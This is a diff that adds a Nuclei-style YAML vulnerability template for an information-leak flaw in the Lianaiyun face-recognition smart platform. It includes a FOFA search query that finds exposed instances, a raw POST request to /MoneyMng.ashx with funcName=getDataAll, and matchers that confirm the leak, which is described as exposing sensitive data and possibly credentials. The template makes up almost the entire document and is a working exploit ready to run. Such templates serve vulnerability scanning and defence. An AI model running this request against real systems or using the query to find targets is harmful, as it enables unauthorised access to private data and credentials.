@@ -1,0 +1,32 @@
+id: lianaiyun-face-platform-info-leak-moneymngashx
+
+info:
+  name: "脸爱云一脸通智慧平台 MoneyMng.ashx 接口存在敏感文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="View/UserReserved/UserReservedTest.aspx"
+      脸爱云一脸通智慧平台在 MoneyMng.ashx 接口实现中存在文件访问控制缺陷，攻击者可通过构造特定请求访问受限文件系统资源，导致敏感数据暴露，包括但不限于凭证信息泄露
+  tags: 脸爱云一脸通智慧平台
+
+http:
+- raw:
+  - |
+    POST /MoneyMng.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+
+    funcName=getDataAll
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'getDay'
